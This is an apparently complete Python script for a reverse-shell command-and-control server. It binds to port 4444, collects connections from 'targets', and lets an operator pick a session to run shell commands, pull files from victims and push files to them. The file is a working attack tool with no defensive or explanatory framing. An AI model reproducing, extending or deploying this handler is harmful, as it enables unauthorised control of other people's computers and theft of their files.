import socket
import json
import base64
import threading

def run(target, ip):
    def send(data):
        json_data = json.dumps(data)
        target.send(json_data.encode('utf-8'))

    def recieve():
        json_data = ''
        while True:
            try:
                json_data += target.recv(1024).decode('utf-8')
                return json.loads(json_data)
            except ValueError:
                continue

    while True:
        command = input('Shell#: ')
        send(command)
        if command == 'exit':
            break
        elif command[:2] == 'cd' and len(command) > 1:
            continue
        elif command[:8] == 'download':
            with open(command[9:], 'wb') as file:
                file_data = recieve()
                file.write(base64.b64decode(file_data))
        elif command[:6] == 'upload':
            with open(command[7:], 'rb') as file:
                send(base64.b64encode(file.read()).decode('utf-8'))
        else:
            result = recieve().encode('utf-8')
            print(result.decode('utf-8'))

def server():
    global clients
    while True:
        if stop_server:
            break
        sock.settimeout(1)
        try:
            target, ip = sock.accept()
            targets.append(target)
            ips.append(ip)
            print(str(targets[clients]) + '-----' + str(ips[clients]) + 'Has connected')
            clients += 1
        except:
            pass

global sock
ips = []
targets = []
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind(('192.168.1.1', 4444))
sock.listen()

clients = 0
stop_server = False

print('[+] Waiting for targets to connect...')

thread = threading.Thread(target=server)
thread.start()

while True:
    command = input('*Center: ')
    if command == 'targets':
        count = 0
        for ip in ips:
            print('Session ' + str(count) + '-----' + str(ip))
            count += 1
    elif command[:7] == 'session':
        try:
            num = int(command[8:])
            tarnum = targets[num]
            tarip = ips[num]
            run(tarnum, tarip)
        except:
            print(['[-] Invalid session'])
